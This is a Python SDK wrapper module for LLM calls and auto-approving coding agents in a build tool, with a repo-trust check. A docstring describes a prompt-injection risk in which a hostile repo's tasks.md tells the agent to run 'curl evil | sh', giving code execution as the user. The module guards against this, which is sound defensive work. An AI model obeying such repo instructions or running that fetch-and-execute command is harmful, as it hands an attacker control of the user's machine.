"""SDK wrapper for LLM calls — single-turn and multi-turn with file tools.

Extends the deep-research pattern with agent_call() for TDD agents that need
to read/write files, run tests, and iterate over multiple turns.

Two call patterns:
- llm_call(): Single-turn, no tools, returns text. For reviews, rubric scoring, etc.
- agent_call(): Multi-turn with file tools, returns AgentResult. For TDD agents.
- llm_call_structured(): Single-turn, returns Pydantic model. For structured output.

Isolation: every SDK invocation disables parent-session setting/hook inheritance
via setting_sources=[] + extra_args={"setting-sources": ""} (SDK bug workaround)
and marks itself with _HOOK_CHILD_SESSION=1 so any hook that still loads skips work.
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import re
import tempfile
from pathlib import Path
from typing import TypeVar

from pydantic import BaseModel, ValidationError

from .models import AgentResult

log = logging.getLogger(__name__)

T = TypeVar("T", bound=BaseModel)

DEFAULT_LLM_CALL_TIMEOUT_S = 600.0
DEFAULT_AGENT_CALL_TIMEOUT_S = 1800.0  # 30 min for implementation agents
MAX_PROMPT_BYTES = 80_000
MAX_CONCURRENT_SDK_CALLS = 10


def _hook_session_dir() -> Path:
    """Directory used as cwd for no-tool SDK calls — prevents project settings.json pickup."""
    cfg = Path(os.environ.get("CLAUDE_CONFIG_DIR", str(Path.home() / ".claude")))
    d = cfg / "hook-sessions"
    d.mkdir(exist_ok=True)
    return d


def _swallow_task_result(task: asyncio.Task) -> None:
    """Consume a cancelled/failed background task's result so asyncio doesn't
    log 'Task exception was never retrieved'."""
    try:
        task.result()
    except (asyncio.CancelledError, Exception):
        pass


async def hard_timeout(coro, timeout_s: float):
    """Run ``coro`` with a wall-clock timeout that ALWAYS returns control.

    Drop-in replacement for ``asyncio.wait_for`` with one critical difference:
    on timeout it cancels the task fire-and-forget and returns immediately
    instead of awaiting the cancellation. ``asyncio.wait_for`` awaits the
    cancellation it triggers, so if the claude-agent-sdk CLI subprocess is
    wedged and its transport teardown never finishes, wait_for hangs forever
    (the multi-hour ~0-CPU hang deep-research hit). ``asyncio.wait`` returns
    (done, pending) at the deadline and does NOT await pending tasks, so a
    wedged subprocess can leak in the background but never stalls the build.

    Raises ``asyncio.TimeoutError`` on timeout (same contract as wait_for).
    """
    task = asyncio.ensure_future(coro)
    done, _ = await asyncio.wait({task}, timeout=timeout_s)
    if task not in done:
        task.cancel()  # best-effort; do NOT await — cancellation may block
        task.add_done_callback(_swallow_task_result)
        raise asyncio.TimeoutError()
    return task.result()


async def _safe_query(*, prompt, options):
    """Wrap SDK query() to skip unknown message types (e.g. rate_limit_event).

    The SDK message parser raises MessageParseError for message types
    it doesn't recognize. This wrapper catches those and continues iteration.
    """
    from claude_agent_sdk import query as raw_query

    gen = raw_query(prompt=prompt, options=options).__aiter__()
    while True:
        try:
            message = await gen.__anext__()
            yield message
        except StopAsyncIteration:
            break
        except Exception as e:
            if "Unknown message type" in str(e):
                log.debug("Skipping unknown SDK message type: %s", e)
                continue
            raise

_sdk_semaphore: asyncio.Semaphore | None = None


def _get_semaphore() -> asyncio.Semaphore:
    global _sdk_semaphore
    if _sdk_semaphore is None:
        _sdk_semaphore = asyncio.Semaphore(MAX_CONCURRENT_SDK_CALLS)
    return _sdk_semaphore


class LLMCallError(Exception):
    """Raised when an LLM call fails beyond retry."""


class LLMCallTimeoutError(LLMCallError):
    """Raised when an LLM call exceeds its timeout."""


class RepoTrustError(LLMCallError):
    """Raised when an agent would run tools in bypassPermissions mode against a
    repository the user has not explicitly marked as trusted."""


def _repo_is_trusted() -> bool:
    """Whether the user has opted into running unattended, auto-approving agents
    against the target repo.

    buildme's implementation/refactor/apply agents run with
    permission_mode="bypassPermissions" and their prompts are assembled from the
    repo's own specs/ (design.md, tasks.md, config.yaml). Pointed at a hostile
    repo, a `tasks.md` that says "first run `curl evil | sh`" becomes code
    execution as the user (CWE-94). We therefore require an explicit opt-in —
    the `--trust-repo` flag or BUILDME_TRUST_REPO=1 — before any such agent runs.
    """
    return os.environ.get("BUILDME_TRUST_REPO", "").strip().lower() in ("1", "true", "yes")


async def llm_call(
    prompt: str,
    *,
    model: str | None = None,
    max_turns: int = 1,
    system_prompt: str | None = None,
    allowed_tools: list[str] | None = None,
    call_timeout: float = DEFAULT_LLM_CALL_TIMEOUT_S,
) -> str:
    """Single-turn LLM call. Returns text response. No tools by default."""
    try:
        from claude_agent_sdk import ClaudeAgentOptions
        from claude_agent_sdk import AssistantMessage, TextBlock
    except ImportError as e:
        raise LLMCallError("claude-agent-sdk not installed") from e

    prompt_file: str | None = None
    effective_tools = list(allowed_tools or [])
    subagent_env: dict[str, str] = {"_HOOK_CHILD_SESSION": "1"}

    if len(prompt.encode("utf-8")) > MAX_PROMPT_BYTES:
        log.info("Prompt too large (%d bytes), writing to temp file", len(prompt.encode("utf-8")))
        with tempfile.NamedTemporaryFile(mode="w", suffix=".md", prefix="build_prompt_", delete=False) as f:
            f.write(prompt)
            prompt_file = f.name
        prompt = (
            f"Read the file {prompt_file} using the Read tool. "
            f"It contains your complete instructions and data. "
            f"After reading, follow those instructions exactly."
        )
        if "Read" not in effective_tools:
            effective_tools.append("Read")
        max_turns = max(max_turns, 3)
        subagent_env["CLAUDE_CODE_FILE_READ_MAX_OUTPUT_TOKENS"] = "100000"

    stderr_lines: list[str] = []
    options = ClaudeAgentOptions(
        allowed_tools=effective_tools,
        max_turns=max_turns,
        permission_mode="bypassPermissions",
        system_prompt=system_prompt,
        model=model,
        env=subagent_env,
        cwd=str(_hook_session_dir()),
        setting_sources=[],
        extra_args={"setting-sources": "", "debug-to-stderr": None},
        stderr=lambda line: stderr_lines.append(line),
    )

    log.info("START sdk_call=llm prompt_bytes=%d model=%s timeout=%.0fs",
             len(prompt.encode("utf-8")), model or "default", call_timeout)
    chunks: list[str] = []
    async with _get_semaphore():
        try:
            async def _run():
                async for message in _safe_query(prompt=prompt, options=options):
                    if isinstance(message, AssistantMessage):
                        for block in message.content:
                            if isinstance(block, TextBlock):
                                chunks.append(block.text)

            await hard_timeout(_run(), call_timeout)
        except asyncio.TimeoutError:
            captured = "\n".join(stderr_lines[-2000:])
            log.error("FAIL sdk_call=llm reason=timeout after %.0fs\n--- CLI stderr (last 2000 lines) ---\n%s",
                      call_timeout, captured)
            raise LLMCallTimeoutError(f"LLM call exceeded {call_timeout:.0f}s timeout")
        except LLMCallTimeoutError:
            raise
        except Exception as e:
            captured = "\n".join(stderr_lines[-2000:])
            log.error("FAIL sdk_call=llm error=%s\n--- CLI stderr (last 2000 lines) ---\n%s", e, captured)
            raise LLMCallError(f"SDK query failed: {e}\n--- CLI stderr ---\n{captured}") from e
        finally:
            if prompt_file:
                try:
                    os.unlink(prompt_file)
                except OSError:
                    pass

    result = "".join(chunks).strip()
    log.info("DONE sdk_call=llm result_chars=%d", len(result))
    return result


async def agent_call(
    prompt: str,
    *,
    allowed_tools: list[str],
    model: str | None = None,
    max_turns: int = 50,
    cwd: str | None = None,
    call_timeout: float = DEFAULT_AGENT_CALL_TIMEOUT_S,
) -> AgentResult:
    """Multi-turn agent call with file tools. For TDD agents.

    The agent can read/write files, run commands, and iterate until done.
    Returns AgentResult with success status, output, and file changes.
    """
    import time

    try:
        from claude_agent_sdk import ClaudeAgentOptions
        from claude_agent_sdk import AssistantMessage, TextBlock, ToolUseBlock
    except ImportError as e:
        raise LLMCallError("claude-agent-sdk not installed") from e

    # Fail closed: these agents auto-approve every tool call (bypassPermissions)
    # and act on instructions drawn from the target repo's specs/. Refuse unless
    # the user has explicitly vouched for the repo.
    if not _repo_is_trusted():
        raise RepoTrustError(
            "buildme runs its implementation agents with auto-approved tool access "
            "(bypassPermissions), executing steps described in this repo's specs/ "
            "(design.md, tasks.md, config.yaml). Only proceed on a repository you "
            "trust — a hostile repo can turn those files into arbitrary command "
            "execution as you.\n"
            "If you authored / trust this repo, re-run with --trust-repo "
            "(or set BUILDME_TRUST_REPO=1)."
        )

    prompt_file: str | None = None
    effective_tools = list(allowed_tools)
    subagent_env: dict[str, str] = {"_HOOK_CHILD_SESSION": "1"}

    if len(prompt.encode("utf-8")) > MAX_PROMPT_BYTES:
        log.info("Agent prompt too large (%d bytes), writing to temp file", len(prompt.encode("utf-8")))
        with tempfile.NamedTemporaryFile(mode="w", suffix=".md", prefix="agent_prompt_", delete=False) as f:
            f.write(prompt)
            prompt_file = f.name
        prompt = (
            f"Read the file {prompt_file} using the Read tool. "
            f"It contains your complete instructions. "
            f"After reading, follow those instructions exactly."
        )
        if "Read" not in effective_tools:
            effective_tools.append("Read")
        max_turns = max(max_turns, 5)
        subagent_env["CLAUDE_CODE_FILE_READ_MAX_OUTPUT_TOKENS"] = "100000"

    stderr_lines: list[str] = []
    options = ClaudeAgentOptions(
        allowed_tools=effective_tools,
        max_turns=max_turns,
        permission_mode="bypassPermissions",
        model=model,
        env=subagent_env,
        cwd=cwd if cwd else str(_hook_session_dir()),
        setting_sources=[],
        extra_args={"setting-sources": "", "debug-to-stderr": None},
        stderr=lambda line: stderr_lines.append(line),
    )

    log.info("START sdk_call=agent tools=%s model=%s max_turns=%d timeout=%.0fs",
             effective_tools, model or "default", max_turns, call_timeout)
    chunks: list[str] = []
    turns = 0
    files_changed: list[str] = []
    start = time.monotonic()

    async with _get_semaphore():
        try:
            async def _run():
                nonlocal turns
                async for message in _safe_query(prompt=prompt, options=options):
                    if isinstance(message, AssistantMessage):
                        turns += 1
                        for block in message.content:
                            if isinstance(block, TextBlock):
                                chunks.append(block.text)
                            elif isinstance(block, ToolUseBlock):
                                if block.name in ("Write", "Edit") and hasattr(block, "input"):
                                    fp = block.input.get("file_path", "")
                                    if fp and fp not in files_changed:
                                        files_changed.append(fp)

            await hard_timeout(_run(), call_timeout)
        except asyncio.TimeoutError:
            elapsed = time.monotonic() - start
            captured = "\n".join(stderr_lines[-2000:])
            log.error("FAIL sdk_call=agent reason=timeout elapsed=%.0fs turns=%d\n--- CLI stderr (last 2000 lines) ---\n%s",
                      elapsed, turns, captured)
            return AgentResult(
                success=False,
                output="".join(chunks).strip(),
                error=f"Agent timed out after {elapsed:.0f}s\nCLI stderr:\n{captured}",
                turns_used=turns,
                elapsed_seconds=elapsed,
                files_changed=files_changed,
            )
        except Exception as e:
            elapsed = time.monotonic() - start
            captured = "\n".join(stderr_lines[-2000:])
            log.error("FAIL sdk_call=agent error=%s elapsed=%.0fs turns=%d\n--- CLI stderr (last 2000 lines) ---\n%s",
                      e, elapsed, turns, captured)
            return AgentResult(
                success=False,
                output="".join(chunks).strip(),
                error=f"{e}\nCLI stderr:\n{captured}",
                turns_used=turns,
                elapsed_seconds=elapsed,
                files_changed=files_changed,
            )
        finally:
            if prompt_file:
                try:
                    os.unlink(prompt_file)
                except OSError:
                    pass

    elapsed = time.monotonic() - start
    log.info("DONE sdk_call=agent turns=%d elapsed=%.0fs files_changed=%d",
             turns, elapsed, len(files_changed))
    return AgentResult(
        success=True,
        output="".join(chunks).strip(),
        turns_used=turns,
        elapsed_seconds=elapsed,
        files_changed=files_changed,
    )


async def llm_call_structured(
    prompt: str,
    schema: type[T],
    *,
    model: str | None = None,
    max_retries: int = 1,
    system_prompt: str | None = None,
    call_timeout: float = DEFAULT_LLM_CALL_TIMEOUT_S,
) -> T:
    """LLM call with Pydantic-validated structured output."""
    current_prompt = prompt
    last_error: Exception | None = None

    for attempt in range(max_retries + 1):
        raw = await llm_call(current_prompt, model=model, system_prompt=system_prompt, call_timeout=call_timeout)
        try:
            payload = extract_json(raw)
            return schema.model_validate(payload)
        except (ValidationError, ValueError, json.JSONDecodeError) as e:
            last_error = e
            log.warning("Structured output validation failed (attempt %d/%d): %s", attempt + 1, max_retries + 1, e)
            if attempt < max_retries:
                current_prompt = (
                    f"{prompt}\n\n---\n"
                    f"Previous response failed validation: {e}\n"
                    f"Return ONLY valid JSON matching this schema:\n"
                    f"{json.dumps(schema.model_json_schema(), indent=2)}\n"
                )

    raise LLMCallError(f"Structured output validation failed after {max_retries + 1} attempts: {last_error}")


def extract_json(text: str) -> dict | list:
    """Extract JSON object/array from a model response."""
    if not text or not text.strip():
        raise ValueError("Empty response")

    # Fenced code blocks
    fence_match = re.search(r"```(?:json)?\s*\n(.*?)\n```", text, re.DOTALL)
    if fence_match:
        return json.loads(fence_match.group(1).strip())

    # Bracket balancing
    stripped = text.strip()
    start = None
    for i, ch in enumerate(stripped):
        if ch in "{[":
            start = i
            break
    if start is None:
        raise ValueError("No JSON object/array found")

    open_ch = stripped[start]
    close_ch = "}" if open_ch == "{" else "]"
    depth = 0
    in_str = False
    escape = False

    for i in range(start, len(stripped)):
        ch = stripped[i]
        if escape:
            escape = False
            continue
        if ch == "\\":
            escape = True
            continue
        if ch == '"' and not escape:
            in_str = not in_str
            continue
        if in_str:
            continue
        if ch == open_ch:
            depth += 1
        elif ch == close_ch:
            depth -= 1
            if depth == 0:
                return json.loads(stripped[start : i + 1])

    raise ValueError("Unbalanced JSON in response")
